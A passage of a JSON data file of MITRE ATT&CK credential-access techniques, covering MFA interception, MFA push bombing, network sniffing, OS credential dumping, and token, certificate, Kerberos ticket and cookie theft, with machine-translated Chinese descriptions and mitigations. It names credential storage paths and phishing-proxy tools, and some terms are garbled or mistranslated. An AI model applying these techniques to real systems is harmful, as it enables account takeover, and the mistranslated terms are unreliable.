                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保只注册了有效的密码筛选器。筛选器DLL必须存在于域控制器和/或本地计算机的Windows安装目录（默认情况下为"
                        },
                        {
                            "type": "code",
                            "content": "C:\\Windows\\System32\\"
                        },
                        {
                            "type": "text",
                            "content": "）中，并在"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_local_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages"
                        },
                        {
                            "type": "text",
                            "content": "中具有相应的条目。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "从Windows 11 22H2开始，可以通过组策略或配置服务提供商禁用"
                        },
                        {
                            "type": "code",
                            "content": "EnableMPRNotifications"
                        },
                        {
                            "type": "text",
                            "content": "策略，以阻止Winlogon向网络提供商发送凭据。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保"
                        },
                        {
                            "type": "code",
                            "content": "AllowReversiblePasswordEncryption"
                        },
                        {
                            "type": "text",
                            "content": "属性设置为禁用，除非有应用程序要求。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核域和本地帐户及其权限级别，以寻找可能允许对手通过获取特权帐户的凭据获得广泛访问权限的情况。这些审计还应包括是否已启用默认帐户，或者是否创建了未经授权的新本地帐户。遵循企业网络设计和管理的最佳实践，以限制跨管理层的特权帐户使用。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "通过适当的权限分离（例如SELinux、grsecurity、AppArmor等）和限制权限提升机会，限制对根帐户的访问，防止用户修改受保护的组件。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "限制可访问混合身份解决方案的本地帐户。例如，将Azure AD Global Administrator帐户限制为仅需要的帐户，并确保这些帐户是专用的纯云帐户，而不是混合帐户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1025",
                "name": "特权流程完整性",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "已启用LSA的功能，如受保护的过程灯（PPL）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制对"
                        },
                        {
                            "type": "code",
                            "content": "/Library/Security/SecurityAgentPlugins"
                        },
                        {
                            "type": "text",
                            "content": "目录的写入访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制注册表权限以禁止修改敏感注册表项，如"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order"
                        },
                        {
                            "type": "text",
                            "content": "。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保实施适当的策略，以规定用户帐户的身份验证机制（如MFA）的安全注册和停用。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1111",
        "name": "Multi-Factor Authentication Interception",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [],
        "version": "2.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以以多因素身份验证（MFA）机制（即，智能卡、令牌生成器等）为目标，以获得对可用于访问系统、服务和网络资源的凭证的访问。建议使用MFA，它比仅使用用户名和密码提供更高级别的安全性，但组织应了解可用于拦截和绕过这些安全机制的技术。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "如果智能卡用于多因素身份验证，则在正常使用过程中需要使用键盘记录程序来获取与智能卡相关的密码。在插入卡和访问智能卡密码的情况下，对手可以使用受感染的系统连接到网络资源，以使用插入的硬件令牌代理身份验证。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可以使用密钥记录器来类似地针对其他硬件令牌，例如RSA SecurID。捕获令牌输入（包括用户的个人识别码）可以提供临时访问（即重放一次性密码直到下一个值滚动），并且可能使对手能够可靠地预测未来的认证值（给定对算法和用于生成附加的临时码的任何种子值的访问）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "MFA的其他方法可能会被对手拦截并用于验证。通过带外通信（电子邮件、短信）发送一次性代码是很常见的。如果设备和/或服务不安全，那么它可能容易被拦截。服务提供商也可能成为目标：例如，对手可能会破坏短信服务，以窃取发送到用户手机的MFA代码。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "不使用时取出智能卡。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1621",
        "name": "Multi-Factor Authentication Request Generation",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图绕过多因素身份验证（MFA）机制，并通过生成发送给用户的MFA请求来访问帐户。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "如果拥有有效帐户凭据的对手无法访问作为额外凭据和安全控制所需的2FA或MFA机制，则他们可能无法完成登录过程。为了规避这一点，对手可能会滥用自动生成的推送通知到MFA服务，如Duo-push、Microsoft Authenticator、Okta或类似服务，让用户授予对其帐户的访问权限。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在某些情况下，对手可能会不断重复登录尝试，以用MFA推送通知、短信和电话轰炸用户，这可能导致用户最终接受身份验证请求，以应对“MFA疲劳”"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1036",
                "name": "帐户使用策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "启用帐户限制，以防止从可疑位置启动登录尝试以及随后的2FA/MFA服务请求，或者当登录尝试的来源与2FA/MFA智能设备的位置不匹配时。使用条件访问策略阻止来自不兼容设备或来自定义的组织IP范围之外的登录。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "实现更安全的2FA/MFA机制，以取代简单的推送或一键式2FA/MFA。例如，让用户将登录屏幕提供的一次性代码输入到2FA/MFA应用程序中，或者利用其他带外2FA/MFA机制（例如，提供需要附带用户引脚的旋转代码的基于旋转代码的硬件令牌）可能更安全。此外，更改默认配置并限制一段时间内可以发送给用户的2FA/MFA请求提示的最大数量。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "培训用户仅接受他们发起的登录尝试中的2FA/MFA请求，审查提示2FA/MFA请求的登录尝试的源位置，并报告可疑/未经请求的提示。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1040",
        "name": "Network Sniffing",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            },
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以嗅探网络流量以捕获关于环境的信息，包括通过网络传递的认证材料。网络嗅探是指使用系统上的网络接口来监视或捕获通过有线或无线连接发送的信息。对手可能会将网络接口置于混杂模式，以被动访问网络传输中的数据，或使用跨端口捕获大量数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通过这种技术捕获的数据可能包括用户凭据，尤其是通过不安全的未加密协议发送的凭据。名称服务解析中毒技术，如LLMNR/NBT-NS中毒和SMB中继，也可用于通过将流量重定向到对手来捕获网站、代理和内部系统的凭据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "网络嗅探还可以揭示配置细节，如运行服务、版本号和其他网络特征（如IP地址、主机名、VLAN ID），这些特征是后续横向移动和/或防御规避活动所必需的。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在基于云的环境中，对手可能仍然能够使用流量镜像服务从虚拟机中嗅探网络流量。例如，AWS流量镜像、GCP数据包镜像和Azure vTap允许用户定义从中收集流量的指定实例和将收集的流量发送到的指定目标。通常，由于在负载均衡器级别使用TLS终止来减少加密和解密流量的压力，因此这些流量中的大部分将是明文的。然后，对手可以使用诸如将数据传输到云帐户之类的过滤技术来访问被嗅探的流量。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在网络设备上，对手可能会使用网络设备CLI命令执行网络捕获，如"
                },
                {
                    "type": "code",
                    "content": "监视器捕获"
                },
                {
                    "type": "text",
                    "content": "。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保所有有线和/或无线通信都经过适当加密。使用Kerberos等身份验证协议的最佳实践，并确保可能包含凭据的web流量受到SSL/TLS的保护。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽可能使用多因素身份验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "拒绝直接访问广播和多播嗅探，并防止LLMNR/NBT-NS中毒和SMB中继等攻击"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在云环境中，除非明确要求，否则请确保未授予用户创建或修改流量镜像的权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1003",
        "name": "OS Credential Dumping",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [
            {
                "id": "T1003.001",
                "name": "LSASS Memory"
            },
            {
                "id": "T1003.002",
                "name": "Security Account Manager"
            },
            {
                "id": "T1003.003",
                "name": "NTDS"
            },
            {
                "id": "T1003.004",
                "name": "LSA Secrets"
            },
            {
                "id": "T1003.005",
                "name": "Cached Domain Credentials"
            },
            {
                "id": "T1003.006",
                "name": "DCSync"
            },
            {
                "id": "T1003.007",
                "name": "Proc Filesystem"
            },
            {
                "id": "T1003.008",
                "name": "/etc/passwd and /etc/shadow"
            }
        ],
        "version": "2.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图转储凭据，以从操作系统和软件获得帐户登录和凭据材料，通常以哈希或明文密码的形式。然后可以使用凭证进行横向移动和访问受限信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "相关子技术中提到的几个工具可能被对手和专业安全测试人员使用。可能还存在其他自定义工具。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "管理“复制目录更改”的访问控制列表以及与域控制器复制相关联的其他权限。请考虑将用户添加到“受保护的用户”Active Directory安全组。这有助于限制用户明文凭据的缓存。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用减少攻击面（ASR）规则以保护LSASS并防止凭据被盗。"
                        }
                    ]
                ]
            },
            {
                "id": "M1043",
                "name": "凭据访问保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10中，微软实施了名为凭据保护的新保护措施，以保护可用于通过凭据转储形式获取凭据的LSA机密。默认情况下未进行配置，并且有硬件和固件系统要求。它也不能防止所有形式的凭据转储。"
                        }
                    ]
                ]
            },
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保域控制器备份的安全性正确。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "请考虑禁用或限制NTLM。请考虑禁用WDigest身份验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂、唯一的密码。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "Windows：除非受到严格控制，否则不要将用户或管理域帐户放在跨系统的本地管理员组中，因为这通常相当于在所有系统上使用相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制跨管理层的特权帐户使用。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "Linux：从内存中删除密码需要root权限。遵循最佳实践，限制对特权帐户的访问，以避免恶意程序访问此类敏感内存区域。"
                        }
                    ]
                ]
            },
            {
                "id": "M1025",
                "name": "特权流程完整性",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 8.1和Windows Server 2012 R2上，启用LSA的Protected Process Light。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过培训用户和管理员不要对多个帐户使用同一密码，限制帐户和系统之间的凭据重叠。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1528",
        "name": "Steal Application Access Token",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "攻击者可以窃取应用程序访问令牌，作为获取访问远程系统和资源的凭据的一种手段。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "应用程序访问令牌用于代表用户或服务发出授权的API请求，通常用作访问基于云和容器的应用程序和软件即服务（SaaS）中的资源的方式。OAuth是一个通常实现的框架，它向用户发布令牌以访问系统。在云和容器化环境中窃取帐户API令牌的攻击者可能能够使用这些帐户的权限访问数据并执行操作，这可能导致权限升级和环境的进一步危害。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在Kubernetes环境中，运行在容器中的进程使用服务帐户令牌与Kubernetesneneneba API服务器通信。如果容器被泄露，攻击者可能会窃取容器的令牌，从而访问Kubernetes API命令。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "代币盗窃也可能通过社会工程发生，在这种情况下，可能需要用户采取行动才能授予访问权限。希望访问基于云的服务或受保护的API的应用程序可以通过各种授权协议使用OAuth 2.0进入。一个常用的序列示例是Microsoft的授权代码授予流。OAuth访问令牌使第三方应用程序能够以应用程序请求的方式与包含用户数据的资源进行交互，而无需获得用户凭据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "攻击者可以通过构建恶意应用程序来利用OAuth授权，该恶意应用程序被设计为被授予使用目标用户的OAuth令牌访问资源的权限。对手将需要在授权服务器上完成其应用程序的注册，例如使用Azure门户、Visual Studio IDE、命令行界面、PowerShell或REST API调用的Microsoft Identity Platform。然后，他们可以向目标用户发送一个钓鱼链接，引诱他们授予对该应用程序的访问权限。一旦授予OAuth访问令牌，应用程序就可以通过应用程序访问令牌获得对用户帐户功能的潜在长期访问。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "应用程序访问令牌可能在有限的使用寿命内发挥作用，从而限制对手使用被盗令牌的时间。然而，在某些情况下，对手也可以窃取应用程序刷新令牌，从而在不提示用户的情况下获得新的访问令牌。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "管理员应审核所有云和容器帐户，以确保它们是必要的，并且授予它们的权限是适当的。此外，管理员应该对所有OAuth应用程序以及授予他们访问组织数据的权限进行审核。应在所有应用程序上广泛进行这项工作，以建立基线，随后对新的或更新的应用程序进行定期审计。应调查并删除可疑的应用程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "管理员可以阻止最终用户同意OAuth应用程序，禁止用户通过OAuth 2.0授权第三方应用程序，并强制所有请求获得管理同意。他们还可以阻止用户对应用程序的最终用户注册，以降低风险。云访问安全代理也可以用于禁止应用程序。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "Azure在Azure管理门户中提供了一些企业策略设置，这些设置可能有助于："
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "“用户->用户设置->应用程序注册：用户可以注册应用程序”可以设置为“否”以阻止用户注册新的应用程序。“企业应用程序->用户设置->企业应用程序：用户可以同意应用程序代表他们访问公司数据”可以设置为“否”，以防止用户同意允许第三方多租户应用程序"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "强制执行基于角色的访问控制，以将帐户限制为所需的最低权限。云访问安全代理（CASB）可用于设置云应用程序的使用策略和管理用户权限，以防止访问应用程序访问令牌。在Kubernetes应用程序中，在不需要访问服务帐户令牌的pod的YAML规范中设置“automountServiceAccountToken:false”。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "需要培训用户不要授权他们不认识的第三方应用程序。用户应特别注意重定向URL：如果URL是与预期服务或SaaS应用程序相关的拼写错误或复杂的单词序列，则网站可能试图欺骗合法服务。用户还应该谨慎对待他们授予应用程序的权限。例如，离线访问和读取电子邮件的访问应该会引起更高的怀疑，因为对手可以利用SaaS API来发现凭据和其他敏感通信。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1649",
        "name": "Steal or Forge Authentication Certificates",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会窃取或伪造用于访问远程系统或资源的身份验证的证书。数字证书通常用于对消息和/或文件进行签名和加密。证书也用作身份验证材料。例如，Azure AD设备证书和Active Directory证书服务（AD CS）证书绑定到一个标识，可以用作域帐户的凭据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "身份验证证书既可能被盗也可能伪造。例如，AD CS证书可能会从加密存储（注册表或文件中）、放错位置的证书文件（即未加密的凭据）或通过各种加密API直接从Windows证书存储中被盗。通过适当的注册权限，域内的用户和/或计算机还可以向企业证书颁发机构（CA）请求和/或手动续订证书。此注册过程定义与证书相关联的各种设置和权限。值得注意的是，证书的扩展密钥使用（EKU）值定义签名、加密和身份验证用例，而证书的使用者备用名称（SAN）值定义证书所有者的备用名称。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "滥用证书作为身份验证凭据可能会导致其他行为，如横向移动。通过允许用户通过与证书相关联的身份（SAN）模拟或假定特权帐户或权限，与证书相关的错误配置也可能为特权升级提供机会。这些滥用还可能通过窃取或伪造证书来实现持久性，这些证书在证书有效期内可以用作有效帐户，尽管用户密码重置了。计算机帐户的身份验证证书也可能被窃取和伪造。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有权访问根（或从属）CA证书私钥（或保护/管理这些密钥的机制）的对手也可以通过伪造受害者域的任意身份验证证书（称为“黄金”证书）来建立持久性。对手也可能以证书和相关服务为目标，以访问其他形式的凭据，如黄金票证授予票证（TGT）或NTLM明文。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保证书颁发机构（CA）得到适当的安全保护，包括将CA服务器（以及承载CA证书的其他资源）视为第0层资产。强化可滥用的CA设置和属性。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "例如，考虑在相关身份验证协议设置中禁用AD CS证书SAN的使用，以强制执行严格的用户映射，并阻止证书作为其他标识进行身份验证。还可以考虑强制CA证书管理器批准将SAN作为发布要求的模板。"
                        }
                    ]
                ]
            },
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "检查并修正不需要的现有身份验证证书以及常见的CA设置和权限配置错误，如AD CS证书注册权限和发布的过于宽松的证书模板（定义已创建证书的可用设置）。例如，可用的AD CS证书模板可以通过证书颁发机构MMC管理单元（"
                        },
                        {
                            "type": "code",
                            "content": "certsrv.msc"
                        },
                        {
                            "type": "text",
                            "content": "）进行检查。"
                        },
                        {
                            "type": "code",
                            "content": "certutil.exe"
                        },
                        {
                            "type": "text",
                            "content": "也可以用于检查AD CS CA数据库中的各种信息。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑禁用旧的/危险的身份验证协议（例如NTLM）以及不必要的证书功能，例如可能存在漏洞的AD CS web和其他注册服务器角色。"
                        }
                    ]
                ]
            },
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保证书以及相关的私钥得到适当的保护。考虑使用其他硬件凭据保护，如可信平台模块（TPM）或硬件安全模块（HSM）。强制HTTPS并启用身份验证的扩展保护。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1558",
        "name": "Steal or Forge Kerberos Tickets",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [
            {
                "id": "T1558.001",
                "name": "Golden Ticket"
            },
            {
                "id": "T1558.002",
                "name": "Silver Ticket"
            },
            {
                "id": "T1558.003",
                "name": "Kerberoasting"
            },
            {
                "id": "T1558.004",
                "name": "AS-REP Roasting"
            }
        ],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图通过窃取或伪造Kerberos票证来破坏Kerberos身份验证，从而启用“通过票证”。Kerberos是一种在现代Windows域环境中广泛使用的身份验证协议。在Kerberos环境（称为“领域”）中，有三个基本参与者：客户端、服务和密钥分发中心（KDC）。客户端请求访问服务，并通过交换源自KDC的Kerberos票证，在成功进行身份验证后授予访问权限。KDC负责身份验证和票证授予。对手可能试图通过窃取票证或伪造票证来滥用Kerberos，以实现未经授权的访问。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在Windows上，内置的"
                },
                {
                    "type": "code",
                    "content": "klist"
                },
                {
                    "type": "text",
                    "content": "实用程序可用于列出和分析缓存的Kerberos票证。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "Active Directory域上的Linux系统将Kerberos凭据本地存储在称为“ccache”的凭据缓存文件中。凭据存储在ccache文件中，同时它们保持有效，通常在用户会话持续期间。在现代Redhat Enterprise Linux系统和衍生发行版上，系统安全服务守护程序（SSSD）处理Kerberos票证。默认情况下，SSSD维护可在"
                },
                {
                    "type": "code",
                    "content": "/var/lib/sss/ssecrets/secrets.ldb"
                },
                {
                    "type": "text",
                    "content": "中找到的票证数据库的副本，以及位于"
                },
                {
                    "type": "code",
                    "content": "/var/lib/sss/ssecrets/.ssecrets.mkey"
                },
                {
                    "type": "text",
                    "content": "的相应密钥。这两个文件都需要root访问权限才能读取。如果对手能够访问数据库和密钥，则可以提取凭证缓存Kerberos blob，并将其转换为可用的Kerberos ccache文件，对手可以使用该文件来传递票证。ccache文件也可以使用Kekeo等工具转换为Windows格式。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "macOS上的Kerberos票证以类似于Linux的标准ccache格式存储。默认情况下，对这些ccache条目的访问是通过马赫RPC协议通过KCM守护进程进行联合的，该协议使用调用方的环境来确定访问。这些ccache条目的存储位置受"
                },
                {
                    "type": "code",
                    "content": "/etc/krb5.conf"
                },
                {
                    "type": "text",
                    "content": "配置文件和"
                },
                {
                    "type": "code",
                    "content": "KRB5CCNAME"
                },
                {
                    "type": "text",
                    "content": "环境变量的影响，后者可以指定将它们保存到磁盘或通过KCM守护进程保护它们。用户可以使用"
                },
                {
                    "type": "code",
                    "content": "kinit"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "klist"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "ktutil"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "kcc"
                },
                {
                    "type": "text",
                    "content": "内置二进制文件或通过苹果的本地Kerberos框架与票证存储交互。对手可以使用开源工具直接与ccache文件交互，也可以使用Kerberos框架调用较低级别的API来提取用户的TGT或服务票证。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "为了包含以前生成的黄金票证的影响，请重置内置的KRBTGT帐户密码两次，这将使使用KRBTGT哈希创建的任何现有黄金票证和从中派生的其他Kerberos票证无效。对于每个域，请更改一次KRBTGT帐户密码，强制复制，然后第二次更改密码。考虑每180天轮换一次KRBTGT帐户密码。"
                        }
                    ]
                ]
            },
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽可能启用AES Kerberos加密（或其他更强的加密算法），而不是RC4。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保服务帐户的密码长度（最好超过25个字符）和复杂性很强，并且这些密码会定期过期。还可以考虑使用集团托管服务帐户或其他第三方产品，如密码保险存储。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将域管理员帐户权限限制为域控制器和有限的服务器。将其他管理功能委托给单独的帐户。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "将服务帐户限制为所需的最低权限，包括域管理员等特权组的成员资格。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1539",
        "name": "Steal Web Session Cookie",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会窃取网络应用程序或服务会话cookie，并使用它们作为经过身份验证的用户访问网络应用程序和互联网服务，而无需凭据。在用户对网站进行身份验证后，Web应用程序和服务通常使用会话cookie作为身份验证令牌。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "Cookie通常在很长一段时间内有效，即使网络应用程序没有被积极使用。Cookie可以在磁盘、浏览器的进程内存以及远程系统的网络流量中找到。此外，目标机器上的其他应用程序可能会在内存中存储敏感的身份验证cookie（例如，向云服务进行身份验证的应用程序）。会话cookie可用于绕过某些多因素身份验证协议。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有几个恶意软件针对本地系统上网络浏览器的cookie的例子。还有一些开源框架，如"
                },
                {
                    "type": "code",
                    "content": "Evilginx2"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "Muraena"
                },
                {
                    "type": "text",
                    "content": "，可以通过恶意代理（例如：中间的敌人）收集会话cookie，这些恶意代理可以由对手设置并用于网络钓鱼活动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在对手获得有效cookie后，他们可以执行Web会话cookie技术来登录到相应的Web应用程序。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用目标登录域作为协商协议一部分的物理第二因素密钥将防止通过代理方法窃取会话cookie。"
                        }
                    ]
                ]
            },
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将浏览器或任务配置为定期删除持久cookie。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "培训用户识别网络钓鱼尝试的各个方面，要求他们在其登录的应用程序的域不正确的网站中输入凭据。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1552",
        "name": "Unsecured Credentials",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [
            {
                "id": "T1552.001",
                "name": "Credentials In Files"
            },
            {
                "id": "T1552.002",
                "name": "Credentials in Registry"
            },
            {
                "id": "T1552.003",
                "name": "Bash History"
            },
            {
                "id": "T1552.004",
                "name": "Private Keys"
            },
            {
                "id": "T1552.005",
                "name": "Cloud Instance Metadata API"
            },
            {
                "id": "T1552.006",
                "name": "Group Policy Preferences"
            },
            {
                "id": "T1552.007",
                "name": "Container API"
            },
            {
                "id": "T1552.008",
                "name": "Chat Messages"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会搜索受损的系统，以找到并获得不安全存储的凭据。这些凭证可以存储和/或放错位置在系统上的许多位置，包括明文文件（例如Bash History）、操作系统或特定于应用程序的存储库（例如注册表中的凭证）或其他专用文件/工件（例如私钥）。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "删除易受攻击的组策略首选项。"
                        }
                    ]
                ]
            },
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "先发制人地搜索包含密码或其他凭据的文件，并在找到时采取措施降低暴露风险。"
                        }
                    ]
                ]
            },
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果可能，将密钥存储在单独的加密硬件上，而不是本地系统上。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制对实例元数据API的访问。正确配置的Web应用程序防火墙（WAF）可以帮助防止外部对手利用允许访问云实例元数据API的服务器端请求伪造（SSRF）攻击。"
                        }
                    ]
                ]
            },
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制对敏感服务的网络访问，如实例元数据API。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
